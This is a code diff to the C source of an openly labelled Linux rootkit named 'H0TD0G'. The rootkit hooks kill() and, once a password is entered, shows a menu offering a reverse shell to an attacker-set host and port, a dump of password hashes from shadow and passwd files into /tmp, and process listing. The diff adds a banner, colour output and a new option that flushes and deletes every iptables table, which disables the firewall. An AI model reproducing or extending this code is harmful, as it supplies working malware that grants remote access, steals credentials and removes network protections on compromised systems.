@@ -12,6 +12,9 @@
 #include <sys/wait.h>
 #include <fcntl.h>
 
+#define GREEN "\x1b[32m"
+#define RESET "\x1b[0m"
+
 #ifndef RTLD_NEXT
 #define RTLD_NEXT ((void *) -1)
 #endif
@@ -44,25 +47,34 @@ int kill(pid_t pid, int sig) {
         if (strcmp(password, pass) == 0) {
             int escolha;
 
-            printf("   H0TD0G ROOTKIT  \n");
-            printf("1) Reverse Shell \n");
-            printf("2) Dump Hashes and Passwords \n");
-            printf("3) List Running Process \n");
-            printf("=> ");
+            printf(GREEN" _    _   ___  _______  _____    ___    _____  _ \n");
+            printf("| |  | | / _ \\|__   __||  __ \\  / _ \\  / ____|| |\n");
+            printf("| |__| || | | |  | |   | |  | || | | || |  __ | |\n");
+            printf("|  __  || | | |  | |   | |  | || | | || | |_ || |\n");
+            printf("| |  | || |_| |  | |   | |__| || |_| || |__| ||_|\n");
+            printf("|_|  |_| \\___/   |_|   |_____/  \\___/  \\_____|(_)\n");
+            printf("\n" RESET);
+            printf(GREEN"               By R4idB0y \n" RESET);
+            printf(GREEN"               Version 0.2 \n" RESET);
+            printf(GREEN"1) Reverse Shell \n" RESET);
+            printf(GREEN"2) Dump Hashes and Passwords \n" RESET);
+            printf(GREEN"3) List Running Process \n" RESET);
+            printf(GREEN"4) Disable IPTables \n" RESET);
+            printf(GREEN"=> " RESET);
             scanf("%d", &escolha);
 
-            switch(escolha) {
+            switch (escolha) {
                 case 1: {
                     int port;
                     char ip[16];
 
-                    printf("[+] SET YOUR LHOST => ");
+                    printf(GREEN"[+] SET YOUR LHOST => " RESET);
                     scanf("%15s", ip);
 
-                    printf("[+] SET YOUR LPORT => ");
+                    printf(GREEN"[+] SET YOUR LPORT => " RESET);
                     scanf("%d", &port);
 
-                    printf("[+] RECEIVED REVERSE SHELL => %s:%d \n", ip, port);
+                    printf(GREEN"[+] RECEIVED REVERSE SHELL => %s:%d \n" RESET, ip, port);
 
                     if (fork() == 0) {
                         struct sockaddr_in revsockaddr;
@@ -114,12 +126,12 @@ int kill(pid_t pid, int sig) {
                         perror("passwd");
                     }
 
-                    printf("[*] Password hashes dumped to /tmp/shadow_dump and /tmp/passwd_dump\n");
+                    printf(GREEN"[*] Password hashes dumped to /tmp/shadow_dump and /tmp/passwd_dump\n" RESET);
                     break;
                 }
 
-                  case 3: {
-                    printf("[*] Listing running processes:\n");
+                case 3: {
+                    printf(GREEN"[*] Listing running processes:\n" RESET);
                     DIR *proc = opendir("/proc");
                     struct dirent *entry;
 
@@ -140,9 +152,25 @@ int kill(pid_t pid, int sig) {
                     break;
                 }
 
+                case 4: {
+                    printf(GREEN "[*] Disabling all IPTables rules... [*]" RESET "\n");
+
+                    system("iptables -F");
+                    system("iptables -X");
+                    system("iptables -t nat -F");
+                    system("iptables -t nat -X");
+                    system("iptables -t mangle -F");
+                    system("iptables -t mangle -X");
+                    system("iptables -t raw -F");
+                    system("iptables -t raw -X");
+
+                    printf(GREEN "[*] All IPTables rules disabled.\n" RESET);
+
+                    break;
+                }
 
                 default:
-                    printf("[!] TRY AGAIN! \n");
+                    printf("[!] Invalid option. Try again.\n");
                     break;
             }
         } else {
